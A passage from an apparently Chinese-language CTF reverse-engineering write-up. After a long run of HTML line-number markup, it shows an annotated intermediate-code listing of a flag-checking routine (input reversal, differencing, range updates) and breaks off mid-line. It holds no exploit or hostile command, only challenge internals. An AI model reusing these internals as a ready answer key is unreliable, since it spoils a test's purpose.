class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//声明一个结构体 </span></span><br><span class="line">STRUCT <span class="built_in">exp</span> :</span><br><span class="line">  ARRAY .key(<span class="type">int</span>)[<span class="number">24</span>]&lt;+<span class="number">0</span>&gt;<span class="comment">//int类型，这里占8个字节，8*24=192</span></span><br><span class="line">  ARRAY .L(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">192</span>&gt;</span><br><span class="line">  ARRAY .R(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">256</span>&gt;</span><br><span class="line">  ARRAY .X(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">320</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FUNCTION read - <span class="number">8</span> :</span><br><span class="line">  PARAM var2&lt;+<span class="number">8</span>&gt;</span><br><span class="line">LABEL Flabelread :</span><br><span class="line"></span><br><span class="line">FUNCTION writes - <span class="number">0</span> :</span><br><span class="line">LABEL Flabelwrites :</span><br><span class="line"></span><br><span class="line">FUNCTION writef - <span class="number">0</span> :</span><br><span class="line">LABEL Flabelwritef :</span><br><span class="line"></span><br><span class="line">FUNCTION <span class="built_in">exit</span> - <span class="number">0</span> :</span><br><span class="line">LABEL Flabelexit :</span><br><span class="line"></span><br><span class="line">FUNCTION main - <span class="number">1640</span> :</span><br><span class="line">  ARRAY <span class="title function_">var11</span><span class="params">(<span class="type">char</span>)</span>[24]&lt;+0&gt;<span class="comment">//char类型占一个字节</span></span><br><span class="line">  STRUCT <span class="title function_">var22</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+488&gt;</span><br><span class="line">  STRUCT <span class="title function_">var23</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+872&gt;</span><br><span class="line">  STRUCT <span class="title function_">var24</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+1256&gt;</span><br><span class="line">  STRUCT <span class="title function_">var25</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+1640&gt;</span><br><span class="line">  ARG var11&lt;+24&gt;</span><br><span class="line">  temp1 := CALL read  <span class="comment">//调用函数，获取我们的flag</span></span><br><span class="line">  temp2 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp2</span><br><span class="line"></span><br><span class="line">  <span class="comment">//第一个循环，运算1</span></span><br><span class="line">LABEL label4 :</span><br><span class="line">  temp4 := #<span class="number">24</span>  <span class="comment">//temp4=24  类似go语言的匿名变量</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp4 GOTO label3  <span class="comment">//一个循环结构</span></span><br><span class="line">  GOTO label2</span><br><span class="line">LABEL label3 :</span><br><span class="line">  temp5 := #<span class="number">0</span></span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; := temp5</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">1</span>}*{var16&lt;+<span class="number">64</span>&gt;}  <span class="comment">//这句就是将 某个变化的值赋值给一个临时的变量，理解为：tempa = var16 + 1 char类型就是一个字节</span></span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; ::= var11&lt;+<span class="number">1</span>&gt;&lt;+tempa&gt;  <span class="comment">//var12 = input[i]</span></span><br><span class="line">  temp6 := #<span class="number">23</span></span><br><span class="line">  temp7 := temp6 - var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp7</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;} <span class="comment">//创建临时变量</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var12&lt;+<span class="number">32</span>&gt;  </span><br><span class="line">      <span class="comment">//var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;获得exp结构体数组的起始地址，exp.key[23-i] = var12 = input[i]</span></span><br><span class="line">  temp3 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp3</span><br><span class="line">  GOTO label4</span><br><span class="line"></span><br><span class="line">  <span class="comment">//第二个循环，运算2</span></span><br><span class="line">LABEL label2 :</span><br><span class="line">  temp8 := #<span class="number">23</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp8</span><br><span class="line">LABEL label11 :</span><br><span class="line">  temp10 := #<span class="number">0</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &gt; temp10 GOTO label10 <span class="comment">//终止条件</span></span><br><span class="line">  GOTO label9</span><br><span class="line">LABEL label10 :</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp11 := #<span class="number">1</span></span><br><span class="line">  temp12 := var15&lt;+<span class="number">56</span>&gt; - temp11  <span class="comment">// i-1</span></span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp12</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp13 := var19&lt;+<span class="number">88</span>&gt; - var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp13</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;} <span class="comment">//i</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;  <span class="comment">// exp.key[i] =exp.key[i] - exp.key[i-1]</span></span><br><span class="line">  temp9 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; - temp9</span><br><span class="line">  GOTO label11</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化数组区</span></span><br><span class="line">LABEL label9 :</span><br><span class="line">  temp15 := #<span class="number">0</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt; := temp15</span><br><span class="line">  temp17 := #<span class="number">8</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt; := temp17</span><br><span class="line">  temp19 := #<span class="number">11</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">488</span>&gt; := temp19</span><br><span class="line">  temp21 := #<span class="number">15</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">1</span>])&lt;+<span class="number">208</span>&gt;&lt;+<span class="number">488</span>&gt; := temp21</span><br><span class="line">  temp23 := #<span class="number">23</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">1</span>])&lt;+<span class="number">272</span>&gt;&lt;+<span class="number">488</span>&gt; := temp23</span><br><span class="line">  temp25 := #<span class="number">0</span></span><br><span class="line">  temp26 := #<span class="number">13</span></span><br><span class="line">  temp27 := temp25 - temp26</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">1</span>])&lt;+<span class="number">336</span>&gt;&lt;+<span class="number">488</span>&gt; := temp27</span><br><span class="line">  temp29 := #<span class="number">2</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">2</span>])&lt;+<span class="number">216</span>&gt;&lt;+<span class="number">488</span>&gt; := temp29</span><br><span class="line">  temp31 := #<span class="number">11</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">2</span>])&lt;+<span class="number">280</span>&gt;&lt;+<span class="number">488</span>&gt; := temp31</span><br><span class="line">  temp33 := #<span class="number">17</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">2</span>])&lt;+<span class="number">344</span>&gt;&lt;+<span class="number">488</span>&gt; := temp33</span><br><span class="line">  temp35 := #<span class="number">10</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">3</span>])&lt;+<span class="number">224</span>&gt;&lt;+<span class="number">488</span>&gt; := temp35</span><br><span class="line">  temp37 := #<span class="number">20</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">3</span>])&lt;+<span class="number">288</span>&gt;&lt;+<span class="number">488</span>&gt; := temp37</span><br><span class="line">  temp39 := #<span class="number">0</span></span><br><span class="line">  temp40 := #<span class="number">19</span></span><br><span class="line">  temp41 := temp39 - temp40</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">3</span>])&lt;+<span class="number">352</span>&gt;&lt;+<span class="number">488</span>&gt; := temp41</span><br><span class="line">  temp43 := #<span class="number">6</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">4</span>])&lt;+<span class="number">232</span>&gt;&lt;+<span class="number">488</span>&gt; := temp43</span><br><span class="line">  temp45 := #<span class="number">13</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">4</span>])&lt;+<span class="number">296</span>&gt;&lt;+<span class="number">488</span>&gt; := temp45</span><br><span class="line">  temp47 := #<span class="number">23</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">4</span>])&lt;+<span class="number">360</span>&gt;&lt;+<span class="number">488</span>&gt; := temp47</span><br><span class="line">  temp49 := #<span class="number">9</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">5</span>])&lt;+<span class="number">240</span>&gt;&lt;+<span class="number">488</span>&gt; := temp49</span><br><span class="line">  temp51 := #<span class="number">21</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">5</span>])&lt;+<span class="number">304</span>&gt;&lt;+<span class="number">488</span>&gt; := temp51</span><br><span class="line">  temp53 := #<span class="number">0</span></span><br><span class="line">  temp54 := #<span class="number">29</span></span><br><span class="line">  temp55 := temp53 - temp54</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">5</span>])&lt;+<span class="number">368</span>&gt;&lt;+<span class="number">488</span>&gt; := temp55</span><br><span class="line">  temp57 := #<span class="number">1</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">6</span>])&lt;+<span class="number">248</span>&gt;&lt;+<span class="number">488</span>&gt; := temp57</span><br><span class="line">  temp59 := #<span class="number">19</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">6</span>])&lt;+<span class="number">312</span>&gt;&lt;+<span class="number">488</span>&gt; := temp59</span><br><span class="line">  temp61 := #<span class="number">31</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">6</span>])&lt;+<span class="number">376</span>&gt;&lt;+<span class="number">488</span>&gt; := temp61</span><br><span class="line">  temp63 := #<span class="number">4</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">7</span>])&lt;+<span class="number">256</span>&gt;&lt;+<span class="number">488</span>&gt; := temp63</span><br><span class="line">  temp65 := #<span class="number">17</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">7</span>])&lt;+<span class="number">320</span>&gt;&lt;+<span class="number">488</span>&gt; := temp65</span><br><span class="line">  temp67 := #<span class="number">0</span></span><br><span class="line">  temp68 := #<span class="number">37</span></span><br><span class="line">  temp69 := temp67 - temp68</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">7</span>])&lt;+<span class="number">384</span>&gt;&lt;+<span class="number">488</span>&gt; := temp69</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//第三个循环，运算3</span></span><br><span class="line">  temp70 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp70</span><br><span class="line">LABEL label43 :</span><br><span class="line">  temp72 := #<span class="number">8</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp72 GOTO label42</span><br><span class="line">  GOTO label41</span><br><span class="line">LABEL label42 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var22(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var19&lt;+<span class="number">88</span>&gt; - var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  temp71 := #<span class="number">1</span></span><br><span 